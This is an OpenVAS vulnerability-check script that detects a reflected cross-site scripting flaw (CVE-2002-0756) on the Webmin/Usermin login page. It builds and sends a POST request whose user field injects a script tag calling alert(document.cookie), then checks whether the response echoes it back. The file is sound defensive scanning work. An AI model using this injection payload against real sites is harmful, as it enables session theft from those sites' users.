###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_webmin_login_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Webmin / Usermin Login Cross Site Scripting Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application";
tag_affected = "Webmin version 0.96
  Usermin version 0.90";
tag_insight = "The flaw is due to improper validation of user-supplied input via the
  authentication page, which allows attackers to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.";
tag_solution = "Upgrade to Webmin version 0.970, Usermin version 0.910 or later.
  For updates refer to http://www.webmin.com/download.html";
tag_summary = "This host is running Webmin/Usermin and is prone to cross site
  scripting vulnerability.";

if(description)
{
  script_id(802258);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-10-20 08:43:23 +0200 (Thu, 20 Oct 2011)");
  script_cve_id("CVE-2002-0756");
  script_bugtraq_id(4694);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Webmin / Usermin Login Cross Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/9036");
  script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/bugtraq/2002-05/0040.html");

  script_description(desc);
  script_summary("Check if Webmin/Usermin is vulnerable to Cross-Site Scripting");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 10000,20000);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:10000);
if(!port){
  port = 20000;
}

## Check Port State
if(!get_port_state(port)) {
  exit(0);
}

## Send and Receive the response
req = http_get(item:"/", port:port);
res = http_keepalive_send_recv(port:port,data:req);

## Confirm the application
if(egrep(pattern:"[Webmin|Usermin]", string:res))
{
  ## Construct Attack Request
  postData = "page=%2F&user=%27%3E%3Cscript%3Ealert%28document.cookie" +
             "%29%3C%2Fscript%3E&pass=";

  req = string("POST /session_login.cgi HTTP/1.1\r\n",
               "Host: ", get_host_name(), "\r\n",
               "Cookie: sid=; testing=1; user=x\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(postData), "\r\n\r\n", postData);

  ## Try XSS Attack
  res = http_keepalive_send_recv(port:port, data:req);

  ## Confirm exploit worked by checking the response
  if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 .*", string:res) &&
     "><script>alert(document.cookie)</script>" >< res){
    security_hole(port);
  }
}
